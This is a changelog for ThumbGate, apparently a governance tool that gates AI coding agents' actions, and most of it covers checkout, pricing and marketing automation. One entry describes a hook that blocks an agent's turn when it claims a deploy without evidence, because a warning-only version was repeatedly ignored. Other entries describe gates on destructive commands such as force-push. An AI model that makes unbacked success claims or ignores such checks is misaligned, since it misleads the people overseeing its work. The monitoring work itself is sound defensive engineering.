- [#1925](https://github.com/IgorGanapolsky/ThumbGate/pull/1925) [`fc1a21a`](https://github.com/IgorGanapolsky/ThumbGate/commit/fc1a21afde1122e6de4cac79016339b5afbcae24) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `/terms` and `/support` public HTML pages (sibling to existing `/privacy`). Required so Stripe's Business → Public details form can be fully populated — "Terms of service URL" and "Customer support URL" both currently 401 on thumbgate.ai. The terms page covers payment, refunds (7-day Pro/Team window, refund-on-request for one-offs), acceptable use, warranty disclaimer, limitation of liability, and governing law. The support page surfaces email, GitHub Issues, the `/health` status path, refund instructions, and a security-disclosure note. Both pages cross-link to each other and `/privacy` to keep the legal triangle navigable.

### Patch Changes

- [#1982](https://github.com/IgorGanapolsky/ThumbGate/pull/1982) [`994fa11`](https://github.com/IgorGanapolsky/ThumbGate/commit/994fa11635b8450890bbb79446dc4dfaef8dab23) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add agent-native memory scope readiness checks that require entity, project, process, and session identifiers before multi-user memory retrieval.

- [#1946](https://github.com/IgorGanapolsky/ThumbGate/pull/1946) [`2b72f9c`](https://github.com/IgorGanapolsky/ThumbGate/commit/2b72f9c5c99dba2a6b1424b098b0cd7c7ab7e59a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `/learn/from-prototype-to-production` build-log article (70-day init→v1.17.0 timeline with real npm download numbers, five hard-won lessons, and an honest `$0 cold-traffic revenue` admission). Listed in the `/learn` article grid and Schema.org `ItemList` at position 6 so the new post is discoverable from the Learn index and reachable through structured-data crawlers.

- [#1981](https://github.com/IgorGanapolsky/ThumbGate/pull/1981) [`d3d3257`](https://github.com/IgorGanapolsky/ThumbGate/commit/d3d32572fb544ac07cf0d26deac41136057162d2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Emit a `stripe_redirect_started` telemetry event in `src/api/server.js` immediately before the 302 to a real Stripe Checkout URL fires, carrying the same attribution payload (`installId`, `acquisitionId`, `visitorId`, `sessionId`, `traceId`, `stripeSessionId`, UTM + creator + community + offer/cta context) as `checkout_bootstrap`. Closes the funnel-observability gap between `checkout_bootstrap` (intent declared) and `/success` (payment completed): a buyer who reaches `checkout_bootstrap` but never produces `stripe_redirect_started` means the Stripe session create failed; one who reaches `stripe_redirect_started` but never `/success` means they bounced from the Stripe-hosted page. Both drops are now individually measurable.

- [#1846](https://github.com/IgorGanapolsky/ThumbGate/pull/1846) [`b793a66`](https://github.com/IgorGanapolsky/ThumbGate/commit/b793a66b2ae4417c27237741822d590c38deafb9) Thanks [@dependabot](https://github.com/apps/dependabot)! - Bump @anthropic-ai/sdk from 0.92.0 to 0.95.2 to keep the shipped runtime dependency set current under ThumbGate's audited release flow.

- [#1981](https://github.com/IgorGanapolsky/ThumbGate/pull/1981) [`d3d3257`](https://github.com/IgorGanapolsky/ThumbGate/commit/d3d32572fb544ac07cf0d26deac41136057162d2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - `scripts/hook-stop-verify-deploy.sh` now hard-blocks the agent's turn when the response contains a deploy claim ("deployed", "shipped", "live in production", "in prod", "production-ready", etc.) without evidence in the same message — a curl to the production host, a `buildSha` string, a `/health` JSON-style version field, an HTTP 200 from the production host, or the verify-deploy-comment workflow's "Deploy verified" sentinel. Previously the hook only printed a warning, which was repeatedly ignored. The block contract matches `hook-stop-pr-thread-check.sh`: a JSON `decision: block` is emitted on stdout. Adds `tests/hook-stop-verify-deploy.test.js` (14 cases) to pin the regex + evidence patterns.

- [#1904](https://github.com/IgorGanapolsky/ThumbGate/pull/1904) [`9d575e5`](https://github.com/IgorGanapolsky/ThumbGate/commit/9d575e559700ba24bc429e724f3b16941a4e13d4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Stop crawler / link-preview traffic from inflating the checkout-start metric and creating zombie Stripe sessions. Stripe API shows 50 sessions created in last 24h, **0 paid, 0 email captured** — a signature of bot/preview fetches not human buyers. Two fixes: (a) add `rel="nofollow noopener noreferrer" target="_blank"` to all `<a href="https://buy.stripe.com/...">` anchors on landing surfaces (7 anchors updated across `public/index.html`, `public/guide.html`, `public/pro.html`), so search engines + social-preview fetchers stop following them and creating sessions; (b) add `Disallow: /checkout/` and `Disallow: /v1/billing/` to `robots.txt` for both default `User-agent: *` and the explicit AI-crawler stanzas. Real humans still reach checkout via JS-driven button clicks, which crawlers don't execute.

- [#1974](https://github.com/IgorGanapolsky/ThumbGate/pull/1974) [`6402631`](https://github.com/IgorGanapolsky/ThumbGate/commit/6402631c4278933b36af47a206bc1985fe431004) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Patch protobufjs security advisories and sanitize social publisher log output.

- [#1982](https://github.com/IgorGanapolsky/ThumbGate/pull/1982) [`994fa11`](https://github.com/IgorGanapolsky/ThumbGate/commit/994fa11635b8450890bbb79446dc4dfaef8dab23) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Tighten CLI log sanitization for social publishing and revenue watcher output.

- [#2053](https://github.com/IgorGanapolsky/ThumbGate/pull/2053) [`b17d18f`](https://github.com/IgorGanapolsky/ThumbGate/commit/b17d18f3d8bde7877e2cfa6c0e68fb3f03d4d531) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Drop the hardcoded `Stripe-Version: 2025-09-30.acacia` header from `scripts/stripe-bootstrap-saas-catalog.js`. That version doesn't exist — Stripe rejected every request with HTTP 400 "Invalid Stripe API version" when the freshly-merged catalog bootstrap was first dispatched. Removing the explicit header so requests use the version pinned to the account, which is Stripe's documented correct default.

- [#2065](https://github.com/IgorGanapolsky/ThumbGate/pull/2065) [`dc9e4c1`](https://github.com/IgorGanapolsky/ThumbGate/commit/dc9e4c12171c8a20ceba898c47c3cd5980cb5e8f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(marketing): surface Rob May / The New Stack social proof on the hero + README.

  Adds a `<figure>` blockquote on `public/index.html` and a matching quote block under the badges in `README.md`. Quote is from Rob May (CEO, Neurometric AI), as published in [The New Stack](https://thenewstack.io/claude-code-agent-view/) — May 2026 — on Anthropic's Claude Code Agent View. Pure third-party validation of ThumbGate's thesis on a high-credibility outlet read by our buyer ICP.

## 1.18.0

### Minor Changes

- [#1877](https://github.com/IgorGanapolsky/ThumbGate/pull/1877) [`879e8bf`](https://github.com/IgorGanapolsky/ThumbGate/commit/879e8bf77b536d3e0f64d3640944645277f48df1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix the actual conversion leak: rewrite the `/checkout/pro` interstitial from a 7-option paradox-of-choice page ("Choose the right paid path. Book $499 diagnostic / Start $1500 sprint / Pay in Stripe / Pay $99 teardown / Pay $19 quick read / Pay $1 first rule / Send workflow first / See options") into a focused Pro confirmation page with trust signals ("Start ThumbGate Pro $19/mo" + 4 verified-customer trust bullets + a single primary "Pay $19/mo with Stripe →" button), with the other 6 paid paths collapsed into a `<details>` "Other paid paths" disclosure. Remove the `confirm=1` bypass from the landing-page Upgrade-to-Pro link so the buyer sees the trust handoff before hitting the bare Stripe form. Verified funnel: 297 checkout starts → 4 paid in 30d (1.3%, vs. 5-15% industry norm) — this addresses the actual leak the audits kept pointing at.

- [#1910](https://github.com/IgorGanapolsky/ThumbGate/pull/1910) [`4a0fbdb`](https://github.com/IgorGanapolsky/ThumbGate/commit/4a0fbdbe1971162c2c3cd85cd4ab19f282ab45e5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `/go/teams` to the tracked-link redirector — was returning HTTP 404 + "Tracked link not found" since the slug wasn't registered in `TRACKED_LINK_TARGETS`. Real impact: Aiventyx marketplace's Teams listing (5 clicks on 8 views ≈ 62% CTR — our strongest-performing external listing) had every click landing on a 404 page after our integrator swapped to the canonical `https://thumbgate.ai/go/teams?utm_source=aiventyx&...` URL. Now redirects to `/checkout/pro` with `plan_id=team&seat_count=3&billing_cycle=monthly` defaults — the 3-seat ($147/mo) self-serve Stripe Team checkout path. UTM params from caller flow through (Aiventyx-attributed clicks remain traceable end-to-end into Stripe). Two regression tests added pinning the redirect contract.

- [#1881](https://github.com/IgorGanapolsky/ThumbGate/pull/1881) [`28aefae`](https://github.com/IgorGanapolsky/ThumbGate/commit/28aefae44ef7d3f8bf029bad91cc6b3f98e9105f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix the activation loop: a single 👎 now auto-promotes a working gate. Lowered `WARN_THRESHOLD` in `scripts/auto-promote-gates.js` from `2 → 1`. Block escalation (`BLOCK_THRESHOLD = 3`) is unchanged, so noise doesn't auto-hard-block. Also expands `HIGH_RISK_TAGS` in `scripts/feedback-to-rules.js` to match the tag vocabulary `inferSemanticTags()` actually emits (`destructive`, `force-push`, `delete`, `drop`, `production`, `database`, `payment`, `credentials`, `secrets`, `data-loss`, etc.) so the high-risk-tag fast-path also triggers on first capture for matching destructive patterns. Cold-buyer experience was: install → give 1 👎 → "No domain has reached the threshold (2) yet" → bail. After this fix: install → give 1 👎 → gate `auto-*` with `action: warn` is live, visible in `npx thumbgate gate-stats`. Updates `tests/auto-promote-gates.test.js` to pin the new 1/3 contract.

- [#1877](https://github.com/IgorGanapolsky/ThumbGate/pull/1877) [`879e8bf`](https://github.com/IgorGanapolsky/ThumbGate/commit/879e8bf77b536d3e0f64d3640944645277f48df1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Open the Team-tier self-serve checkout path. The Stripe price ID (`STRIPE_PRICE_ID_TEAM_MONTHLY`), the server-side checkout session creator, and the `plan_id=team&seat_count=N` URL routing were already fully wired — the landing page just hadn't exposed a button. The Team pricing card now leads with **"Start 3-seat Team — $147/mo"** (a direct `/checkout/pro` link that creates a Stripe subscription session via the existing `createCheckoutSession` flow), with the Workflow Hardening Sprint intake demoted to a secondary qualification path. Engineering Managers can now swipe a card without booking a sales call.

### Patch Changes

- [#1878](https://github.com/IgorGanapolsky/ThumbGate/pull/1878) [`e788db7`](https://github.com/IgorGanapolsky/ThumbGate/commit/e788db79426cbad60f2f583068ed393da0d817ce) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `docs/marketing/buyer-leads-2026-05-11.md`: 16 named GitHub-user leads with verifiable issue quotes, tier classification (Pro / Team / Sprint), and personalized 3-sentence reply drafts. Built from `gh api search/issues` queries against four failure patterns ThumbGate solves: agent destructive ops, hallucinated content/imports, force-push/branch-rename mistakes, and PreToolUse hook gaps. CEO-only outreach (auto-posting still locked per 2026-04-21 directive); UTM tagging scheme defined for per-lead conversion attribution.

- [#1380](https://github.com/IgorGanapolsky/ThumbGate/pull/1380) [`734f5e6`](https://github.com/IgorGanapolsky/ThumbGate/commit/734f5e60a69e91bbe3a368b87356732c7a6b4fd4) Thanks [@dependabot](https://github.com/apps/dependabot)! - Bump @huggingface/transformers from 4.1.0 to 4.2.0 to keep the shipped runtime dependency set current under ThumbGate's audited release flow.

- [#1845](https://github.com/IgorGanapolsky/ThumbGate/pull/1845) [`85d640f`](https://github.com/IgorGanapolsky/ThumbGate/commit/85d640f86723860942568aaa51e1132afb388892) Thanks [@dependabot](https://github.com/apps/dependabot)! - Bump @changesets/changelog-github from 0.6.0 to 0.7.0 to keep the shipped build and test dependency set current under ThumbGate's audited release flow.

- [#1910](https://github.com/IgorGanapolsky/ThumbGate/pull/1910) [`4a0fbdb`](https://github.com/IgorGanapolsky/ThumbGate/commit/4a0fbdbe1971162c2c3cd85cd4ab19f282ab45e5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add an offline feedback-quality eval that reports JSONL signal quality, SQLite lesson coverage, and LanceDB retrieval-export metrics without adding runtime ML dependencies.

- [#1527](https://github.com/IgorGanapolsky/ThumbGate/pull/1527) [`58e63d4`](https://github.com/IgorGanapolsky/ThumbGate/commit/58e63d4d377b9b5cb5579c11ac6dd4719a189221) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Clarify the GTM operator handoff by surfacing aggregate GitHub-ready prospect counts and explaining how GitHub leads are split across self-serve, production-rollout, and seed-stage buckets.

- [#1522](https://github.com/IgorGanapolsky/ThumbGate/pull/1522) [`7b87c81`](https://github.com/IgorGanapolsky/ThumbGate/commit/7b87c8174d4026191a5e399d6e8f70e2a99b502d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a flat marketplace submission sheet to the GTM revenue loop so operator-ready listing surfaces can be exported from the same evidence-backed copy pack and variant metadata.

- [#1877](https://github.com/IgorGanapolsky/ThumbGate/pull/1877) [`879e8bf`](https://github.com/IgorGanapolsky/ThumbGate/commit/879e8bf77b536d3e0f64d3640944645277f48df1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Rewrite the Pro pricing card from feature-bullets to outcome-claims. Each bullet now leads with what the buyer gets ("Block every repeat mistake", "Never re-explain a correction", "Ship hardened agents to production") before stating the mechanism that delivers it. Sub-headline tightened from "For builders who want proof, exports, and unlimited local learning" to "Stop paying tokens to re-correct the same agent mistake across sessions." Tier label simplified from "Solo Pro" to "Pro" — solo-buyer framing was a self-imposed ceiling. All existing test substrings preserved.

- [#1901](https://github.com/IgorGanapolsky/ThumbGate/pull/1901) [`ff9b17a`](https://github.com/IgorGanapolsky/ThumbGate/commit/ff9b17ad832c3ffc14d5283ae4a609ce2eef65e4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fail confirmed revenue email dispatches when Resend rejects the send. This prevents revenue workflows from recording a successful run when the provider returns an API error such as an unverified sender domain.

## 1.17.0

### Minor Changes

- [#1869](https://github.com/IgorGanapolsky/ThumbGate/pull/1869) [`3ae83c4`](https://github.com/IgorGanapolsky/ThumbGate/commit/3ae83c43e2ab5b1a39233e7ca02fe64c8a9d4c20) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Free tier now grants unlimited feedback captures and up to 5 active auto-promoted prevention rules (previously 3 lifetime captures + 1 rule). The hard 3-capture wall blocked habit formation; this opens the daily-use lane while keeping the dashboard, recall, lesson search, unlimited rules, and DPO export gated to Pro.

### Patch Changes

- [#1805](https://github.com/IgorGanapolsky/ThumbGate/pull/1805) [`dd324fd`](https://github.com/IgorGanapolsky/ThumbGate/commit/dd324fda27ac3e81bccaef2e786f409b2dc441c6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Enable Ralph Loop to auto-publish a bounded set of safe Bluesky replies during scheduled engagement runs while leaving risky replies in the review draft queue.

- [#1807](https://github.com/IgorGanapolsky/ThumbGate/pull/1807) [`013be4c`](https://github.com/IgorGanapolsky/ThumbGate/commit/013be4c272dff0e4c2103284e56c68804b1d25b9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add VS Code/Open VSX, Antigravity-compatible, and JetBrains plugin distribution assets.

- [#1817](https://github.com/IgorGanapolsky/ThumbGate/pull/1817) [`8ad7f56`](https://github.com/IgorGanapolsky/ThumbGate/commit/8ad7f565bd037a9453418a4244836ad2f74c4a1d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a pure-CSS animated terminal block-demo to the hero. Loops on its own (no click-to-play), types `git push --force origin main`, then shows ThumbGate blocking the action with the rule name, reason, and a suggested fix. Honors `prefers-reduced-motion`. The existing 90-second walkthrough video stays below as the longer-form CTA.

- [#1866](https://github.com/IgorGanapolsky/ThumbGate/pull/1866) [`65e563e`](https://github.com/IgorGanapolsky/ThumbGate/commit/65e563ee2533661ff3999d275f37d6d423b3634a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix three broken navigation paths on the homepage: the ThumbGate logo link (`href="#"` → `/`), the header "Install Free" button (was pointing at the ChatGPT GPT redirect; now points at the actual install flow), and the hero + final "Install Free CLI" buttons (now copy `npx thumbgate init` to clipboard inline with visible "Copied ✓" feedback, instead of redirecting to `/guide` where buyers perceive "nothing happened").

- [#1871](https://github.com/IgorGanapolsky/ThumbGate/pull/1871) [`68108a6`](https://github.com/IgorGanapolsky/ThumbGate/commit/68108a61cc258ed08ebc2e5e967b697e99385cce) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Drop "Max Smith KDP LLC" from public landing + blog footers and Schema.org publisher metadata. "KDP" reads as Kindle Direct Publishing to enterprise buyers evaluating an agent governance tool, and the trust hit is quiet but consistent. Now reads "© 2026 ThumbGate · MIT License".

- [#1873](https://github.com/IgorGanapolsky/ThumbGate/pull/1873) [`88ac1b4`](https://github.com/IgorGanapolsky/ThumbGate/commit/88ac1b44620e6357a7afaa1d2e9f44a24f2faee0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Swap landing hero secondary CTA from "Pay $499 diagnostic" to "Get Pro — $19/mo". Cold-visitor conversion: the natural hero pair is Install Free + the $19/mo self-serve path. The $499 diagnostic still ships via the Workflow Hardening Sprint intake panel below the hero, so high-ticket service buyers still have a clear path.

- [#1855](https://github.com/IgorGanapolsky/ThumbGate/pull/1855) [`75d154f`](https://github.com/IgorGanapolsky/ThumbGate/commit/75d154f3338ecc9112eb0f9d8c4eb504bd62affe) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Hide visible-text leak on thumbgate.ai: analytics CTA IDs (`hero_workflow_sprint_diagnostic_checkout`, `workflow_sprint_checkout_started`, etc.) and raw HTML attribute names (`id=`, `name=`, `data-team-intake-form`) were rendering as plain `<p>` body paragraphs. Moved into a `hidden` block — strings stay in HTML for regex tests, nothing renders to visitors.

- [#1844](https://github.com/IgorGanapolsky/ThumbGate/pull/1844) [`af9de4e`](https://github.com/IgorGanapolsky/ThumbGate/commit/af9de4e72bf3cda1ac5a50768247154647348cf0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix public landing and marketing link hygiene by adding route aliases for legacy public URLs, preventing empty revenue links, and removing unsupported pricing, traction, and guarantee claims from public copy.

- [#1873](https://github.com/IgorGanapolsky/ThumbGate/pull/1873) [`88ac1b4`](https://github.com/IgorGanapolsky/ThumbGate/commit/88ac1b44620e6357a7afaa1d2e9f44a24f2faee0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add live npm weekly-downloads badge to the landing hero trust bar. Real momentum (verifiable via shields.io against `npm/dw/thumbgate`) replaces a vague "MIT open source" pill as the leading trust signal. Auto-updates as installs grow — no manual copy edits required.

- [#1808](https://github.com/IgorGanapolsky/ThumbGate/pull/1808) [`3650374`](https://github.com/IgorGanapolsky/ThumbGate/commit/36503740e787db6c1da0e9ef9905f3ce30bc035d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Persist Bluesky prospect dedupe state across Ralph Loop runs so scheduled engagement does not requeue the same prospects.

- [#1869](https://github.com/IgorGanapolsky/ThumbGate/pull/1869) [`3ae83c4`](https://github.com/IgorGanapolsky/ThumbGate/commit/3ae83c43e2ab5b1a39233e7ca02fe64c8a9d4c20) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - `repairGithubMarketplaceRevenueLedger` now also walks the funnel ledger and persists resolved amounts for `paid` `github_marketplace` orders that never landed in `revenue-events.jsonl`. PR [#1810](https://github.com/IgorGanapolsky/ThumbGate/issues/1810) fixed read-time resolution; this fix completes the loop by writing recovered rows to disk so audits and downstream exports see them too. Idempotent — only persists when plan pricing produces a known amount, and skips rows already in the ledger.

- [#1810](https://github.com/IgorGanapolsky/ThumbGate/pull/1810) [`dbd0476`](https://github.com/IgorGanapolsky/ThumbGate/commit/dbd0476c3537d54f467447cddc4388b3eb6701f8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Resolve plan amounts for funnel-derived github_marketplace paid events so `cfo --today` no longer reports `$0.00` when orders only exist in the funnel ledger. The read-time deriver now runs entries through the same plan-pricing resolver the on-disk revenue ledger already uses.

- [#1831](https://github.com/IgorGanapolsky/ThumbGate/pull/1831) [`8a4d5f0`](https://github.com/IgorGanapolsky/ThumbGate/commit/8a4d5f059b20dd9007ed091da3d2075a524bc427) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Simplify the public landing page conversion path, removing cluttered hero micro-offers and stale proof claims while keeping pricing claims aligned with the enforced Free, Pro, and Team feature limits.

- [#1857](https://github.com/IgorGanapolsky/ThumbGate/pull/1857) [`55ec588`](https://github.com/IgorGanapolsky/ThumbGate/commit/55ec58851b55daa0dfa883af84c577bf9b9dcf85) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - `scripts/post-everywhere.js` now surfaces a clear error when TikTok routing is requested, instead of crashing with `TypeError: tiktok.publishPost is not a function`. TikTok has no text-only Direct Post endpoint; the working paths are `scripts/social-pipeline.js` with a recorded MP4 or direct `publishTikTokVideo({ videoUrl, title })` invocation.

## 1.16.22

### Patch Changes

- [#1777](https://github.com/IgorGanapolsky/ThumbGate/pull/1777) [`990b10b`](https://github.com/IgorGanapolsky/ThumbGate/commit/990b10b6618ea07c4ba20e405ef01b21dcbbdf4e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add high-ROI agent governance runtime checks for hybrid RAG scale, inference economics, model-harness fit, solver-backed workflows, and org-wide agent registry governance.

- [#1755](https://github.com/IgorGanapolsky/ThumbGate/pull/1755) [`108f8ea`](https://github.com/IgorGanapolsky/ThumbGate/commit/108f8ea572e883fefe7b4f1d246a68957abeee61) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a guarded Resend-backed Aiventyx partner email dispatch workflow for same-day marketplace revenue follow-up.

- [#1769](https://github.com/IgorGanapolsky/ThumbGate/pull/1769) [`6c97652`](https://github.com/IgorGanapolsky/ThumbGate/commit/6c97652710cbe561d9f5943029a47ce031cc4c4e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a bounded Bluesky safe-reply publishing mode for manual revenue engagement runs.

- [#1719](https://github.com/IgorGanapolsky/ThumbGate/pull/1719) [`6793790`](https://github.com/IgorGanapolsky/ThumbGate/commit/6793790cddb8d5d093496b131ec252ec27bf0b88) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Send real browser checkout traffic directly to the Stripe email gate while keeping bot-safe checkout interstitials.

- [#1758](https://github.com/IgorGanapolsky/ThumbGate/pull/1758) [`b85f9eb`](https://github.com/IgorGanapolsky/ThumbGate/commit/b85f9ebc03386d1071ed3b0b132741899de8c906) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add first-dollar and quick-read recovery links to the checkout cancellation page so abandoned buyers can restart with a lower-friction paid path.

- [#1773](https://github.com/IgorGanapolsky/ThumbGate/pull/1773) [`4432906`](https://github.com/IgorGanapolsky/ThumbGate/commit/4432906163b554d27a77d4cefb6aed60b9d6f2cd) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add low-friction checkout recovery offers to the checkout intent and cancel paths.

- [#1728](https://github.com/IgorGanapolsky/ThumbGate/pull/1728) [`68f9ba2`](https://github.com/IgorGanapolsky/ThumbGate/commit/68f9ba2abeb5d44d1129cf2b572369a5a89ca792) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Track the community course platform launch kit in the test suite so Skool and course-platform promotion guardrails stay covered.

- [#1747](https://github.com/IgorGanapolsky/ThumbGate/pull/1747) [`b724bb8`](https://github.com/IgorGanapolsky/ThumbGate/commit/b724bb8ea459475a07db2f67a5ca637877b03818) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Send hydrated Pro buyer CTAs directly to confirmed Stripe checkout while preserving attribution and bot-safe fallback routes.

- [#1743](https://github.com/IgorGanapolsky/ThumbGate/pull/1743) [`4ad2387`](https://github.com/IgorGanapolsky/ThumbGate/commit/4ad2387af95f9568fb65af6c4a6c0f5bb9399925) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Route the paid workflow-hardening sprint campaign through direct Stripe checkout links with paid-sprint attribution.

- [#1756](https://github.com/IgorGanapolsky/ThumbGate/pull/1756) [`0d527b1`](https://github.com/IgorGanapolsky/ThumbGate/commit/0d527b18b2d85cfb1fbcbb676b4fcb61105386d6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a first-dollar failure-rule checkout CTA to the homepage and Pro buyer paths.

- [#1801](https://github.com/IgorGanapolsky/ThumbGate/pull/1801) [`86277a8`](https://github.com/IgorGanapolsky/ThumbGate/commit/86277a86a2cedef4394c93a2ddec41c1e5b7d206) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix `thumbgate pro --upgrade` in the public npm package by shipping the local Pro upgrade bundle from `config/pro` and adding a clear missing-bundle error instead of referencing an unpublished top-level `pro/` subtree.

- [#1754](https://github.com/IgorGanapolsky/ThumbGate/pull/1754) [`752a588`](https://github.com/IgorGanapolsky/ThumbGate/commit/752a588d5bc947366ba796a6870e8e3b9fbaa23a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Skip Instagram in text-only Zernio offer dispatches unless media is attached, keeping LinkedIn, Threads, and Bluesky publishes from failing after a successful post.

- [#1749](https://github.com/IgorGanapolsky/ThumbGate/pull/1749) [`4d70bb7`](https://github.com/IgorGanapolsky/ThumbGate/commit/4d70bb7c9969014f7de9485dfefbd91db89ed4c7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a guarded GitHub Actions dispatch path for warm Reddit diagnostic DMs.

- [#1735](https://github.com/IgorGanapolsky/ThumbGate/pull/1735) [`01adcb9`](https://github.com/IgorGanapolsky/ThumbGate/commit/01adcb9b19a7ef0ca86c52170a7ed711e81156f2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add direct paid Pro and workflow sprint calls to action near the setup guide install path.

- [#1768](https://github.com/IgorGanapolsky/ThumbGate/pull/1768) [`64d1f8d`](https://github.com/IgorGanapolsky/ThumbGate/commit/64d1f8d29b368773318003f56278fc933f743ba3) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Treat duplicate Instagram content blocks from Zernio as safe skipped outcomes instead of failing the Instagram Autopilot workflow.

- [#1745](https://github.com/IgorGanapolsky/ThumbGate/pull/1745) [`0ce9a65`](https://github.com/IgorGanapolsky/ThumbGate/commit/0ce9a655407098e2ea3f352e5f86ea30a99eab8d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Warn instead of failing the LinkedIn post-dispatch workflow when LinkedIn credentials are missing or revoked.

- [#1741](https://github.com/IgorGanapolsky/ThumbGate/pull/1741) [`e6b9409`](https://github.com/IgorGanapolsky/ThumbGate/commit/e6b9409a3315d1e71a873d3706909a727dc742ac) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix marketing autopilot text publishing by generating a paid-offer post file before invoking post-everywhere, limiting the text step to text/image-capable channels, and preserving campaign UTM attribution.

- [#1727](https://github.com/IgorGanapolsky/ThumbGate/pull/1727) [`532c072`](https://github.com/IgorGanapolsky/ThumbGate/commit/532c0729ebe629f79abdf033a659ba5c3f2740ff) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a guarded money marketplace distribution pack for Lindy, Gumroad, and GoHighLevel revenue motions.

- [#1777](https://github.com/IgorGanapolsky/ThumbGate/pull/1777) [`990b10b`](https://github.com/IgorGanapolsky/ThumbGate/commit/990b10b6618ea07c4ba20e405ef01b21dcbbdf4e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add checkout-ready ThumbGate + OpenClaw digital kit assets, live Stripe links, Zernio promotion copy, and a landing-page CTA for the first self-serve governance kit.

- [#1738](https://github.com/IgorGanapolsky/ThumbGate/pull/1738) [`50a4f8d`](https://github.com/IgorGanapolsky/ThumbGate/commit/50a4f8dffbec6180bd5ffd79968ba93801a7fe9e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a paid workflow-sprint Zernio campaign option for direct diagnostic and implementation-sprint revenue posts.

- [#1792](https://github.com/IgorGanapolsky/ThumbGate/pull/1792) [`0b415b5`](https://github.com/IgorGanapolsky/ThumbGate/commit/0b415b5e20d8b2b959fda2576b4efaf86dac3e03) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Route high-intent Pro page visitors to the direct quick-read checkout while keeping the Pro dashboard checkout available.

- [#1723](https://github.com/IgorGanapolsky/ThumbGate/pull/1723) [`a9588ab`](https://github.com/IgorGanapolsky/ThumbGate/commit/a9588abad5695fb497e0178d63c9cbd1197fbed3) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a high-intent paid diagnostic and sprint recovery path to the Pro page.

- [#1777](https://github.com/IgorGanapolsky/ThumbGate/pull/1777) [`990b10b`](https://github.com/IgorGanapolsky/ThumbGate/commit/990b10b6618ea07c4ba20e405ef01b21dcbbdf4e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a ProgramBench-style cleanroom smoke proof lane to ThumbGate Bench, publish the benchmark fixtures with the npm package, and expose the high-ticket Reliable AI Agent Governance Setup intake path on the landing page.

- [#1760](https://github.com/IgorGanapolsky/ThumbGate/pull/1760) [`d5bc51c`](https://github.com/IgorGanapolsky/ThumbGate/commit/d5bc51ce4392533be359cda45c4b1d5849953cea) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Treat thrown Zernio duplicate-post responses as skipped promo outcomes so idempotent paid-offer reruns stay green.

- [#1759](https://github.com/IgorGanapolsky/ThumbGate/pull/1759) [`fb942ce`](https://github.com/IgorGanapolsky/ThumbGate/commit/fb942ce2459ff71122ef4b86987c2937aa277ded) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Treat recent duplicate social publishes and Reddit text-post restrictions as skipped promo outcomes instead of fatal ThumbGate Creator Platform Promo failures.

